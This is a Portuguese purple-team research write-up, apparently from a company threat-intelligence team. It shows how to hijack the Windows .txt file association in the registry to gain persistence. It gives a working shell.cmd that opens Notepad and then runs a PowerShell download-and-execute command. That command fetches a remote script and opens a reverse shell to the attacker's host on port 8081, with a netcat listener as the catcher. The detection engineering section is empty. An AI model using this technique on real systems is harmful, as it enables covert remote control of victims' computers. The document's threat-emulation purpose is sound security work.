
<p align="center">
  <img src="./imagens/ISHLOGO.png" alt="Logo do Purple Team" width="300" height="300">
</p>

# CTI Purple Team - Execução Acionada por Evento: Alterar Associação de Arquivo Padrão 

Quando um arquivo é criado em um sistema operacional como o Windows, ele é automaticamente associado a um programa específico que será usado para abrir esse tipo de arquivo quando clicado duas vezes. A execução acionada por evento permite que os usuários personalizem a maneira como os arquivos são abertos, definindo regras específicas para acionar a execução de aplicativos diferentes com base em diferentes eventos.

Neste contexto, exploraremos os conceitos por trás da execução acionada por evento representando o sequestro da extenção ***.txt***, sendo possível executar um aplicativo malicioso antes que o arquivo real seja aberto, gerando um reverse shell na máquina do atacante, a fim de obter persistência.

<p align="center">
  <img src="imagens/Fluxograma_ServiceExecution.png">
</p>

**A priori, para executar o sequestro de extensão, é importante salientar que o atacante já possua o primeiro acesso inicial à máquina alvo, com privilégios administrativos. Portando, já ter realizado a Execução e Escalação de Privilégios na vítima**.

## Contexto

Ao clicar duas vezes em um arquivo ***.txt***, ele é aberto com um ***notepad.exe***. O windows por padrão sabe que para abrir esse tipo de extensão precisa usar o *notepad.exe*.

As seleções de associação de arquivos são armazenados no Registro do Windows e estão listadas em **HKEY_CLASSES_ROOT.[extention]**, no caso dessa pesquisa será listado em **HKEY_CLASSES_ROOT.txt** e, podem ser editados por administradores ou programas que tenham acesso ao Registro ou por administradores usando o utilitário associado, desde que tenham elevação de privilégio de administrador. 

## Emulação de Ameaça - Criação de Arquivo Malicioso Através do ps.exe

Há dois locais de registro que definem os manipuladores de extensão, que são mostrados a seguir, e são classificados como: *Global* e *Local*.

<p align="center">
  <img src="imagens/locais-de-registro.png">
</p>

Quando um usuário tenta abrir um arquivo, o sistema operacional verifica os registros locais em (HKEY_CURRENT_USER) para determinar qual programa está designado para lidar com aquela extensão de arquivo. Caso nao houver nenhuma entrada de registro associada, a verificação é feita na árvore de registro global (HKEY_CLASSES_ROOT).

Dependendo dos privilégios do usuário (Administrador ou Usuário Padrão), esses locais de registro podem ser explorados para executar código malicioso, utilizando o manipulador de extensão como um gatilho.

Portanto, podemos observar que o manipulador de extensão ***.txt*** está definido na chave de registro abaixo:
```zsh
Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command
```

Abaixo exemplifico que o comando responsável por abrir arquivos *.txt* é o *notepad.exe %1*, onde o argumento *%1*, especifica um nome de arquivo qualquer, ou seja, é uma variante para o nome dos arquivos que o bloco de notas deve abrir:

<p align="center">
  <img src="imagens/Editor-de-registro-HKEY.png">
</p>

Supomos que o usuário alvo possua uma arquivo chamado ***test.txt*** em sua área de trabalho, contendo o conteúdo do arquivo ilustrado abaixo:

<p align="center">
  <img src="imagens/arquivo-vitima.png">
</p>

Iremos criar agora um arquivo malicioso que será executado quando o usuário alvo tentar abrir o arquivo chamado test.txt, sendo que com a execução desta têcnica pode ser qualquer arquivo aleatório, apenas seguindo o critério de extenção .txt usado como exemplo nesta pesquisa.

Para isso, criaremos um arquivo em lotes simples do Windows chamado ***shell.cmd*** na maquina do usuário alvo:
```zsh
start notepad.exe %1
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.140.128/purplecat.ps1');purplecat -c 192.168.140.128 -p 8081 -e cmd.exe"


```
Este comando do PowerShell baixa um script remoto chamado purplecat.ps1 de um local específico e, em seguida, usa esse script para estabelecer uma conexão "backdoor" com uma máquina remota no endereço IP 192.168.140.128 na porta 8081, permitindo que comandos sejam executados cmd.exe nessa máquina.






A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro de Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command para C:\Users\Win-test\Desktop\shell.cmd, local onde nosso arquivo malicioso está gravado.

<p align="center">
  <img src="imagens/mod.registro.png">
</p>

Após a modificação a chave de registro se encontrará da mesma maneira que a imagem a seguir:

<p align="center">
  <img src="imagens/modificado.png">
</p>

A seguir na máquina do atacante, iremos rodar dois comandos no terminal, um para baixar o arquivo aberto pelo usuário e outro para escutar a porta selecionada para sequestrar a sessão do sistema da vítima:

<p align="center">
  <img src="imagens/comando-para-baixar-arquivo.png">
</p>

O comando acima, baixa os arquivos .txt abertos pela vítima. E o comando abaixo utilizaremos o [*NetCat*](https://www.devmedia.com.br/netcat-o-canivete-suico-tcp-ip-revista-infra-magazine-8/26299#:~:text=O%20Netcat%2C%20criado%20em%202004,conectividade%2C%20seguran%C3%A7a%2C%20entre%20outros.) como Listener, ao ser iniciado irá ouvir qualquer conexão realizada na porta **8081/TCP**. 

<p align="center">
  <img src="imagens/comando-escustar-maquina-alvo.png">
</p>

Após realizar todos esses passos, quando o usuário alvo abrir qualquer arquivo .txt e executar o arquivo malicioso simultâneamente, a conexão será realizada com o *listener* na porta **8081/TCP**, mencionada acima.

![Gif-emulação](imagens/gif-emulação.gif)

## Engenharia de Detecção



# Conclusão

Esperamos que você que leu ou assistiu o Webinar, possa ter compreendido a inteligência que trouxemos nesta pesquisa. Qualquer dúvida, é só nos contactar.

## Link do Webinar

Caso você não pode participar do Webinar de apresentação da pesquisa, ou gostaria rever, basta clicar neste [link](https://ishtecnologia.sharepoint.com/sites/CTI-PurpleTeam/_layouts/15/stream.aspx?id=%2Fsites%2FCTI%2DPurpleTeam%2FDocumentos%20Compartilhados%2FVideos%2FCTI%20Purple%20Team%20%2D%20Movimenta%C3%A7%C3%A3o%20Lateral%20Atrav%C3%A9s%20do%20Invoke%2DSMBExec%2Emp4&referrer=StreamWebApp%2EWeb&referrerScenario=AddressBarCopied%2Eview).
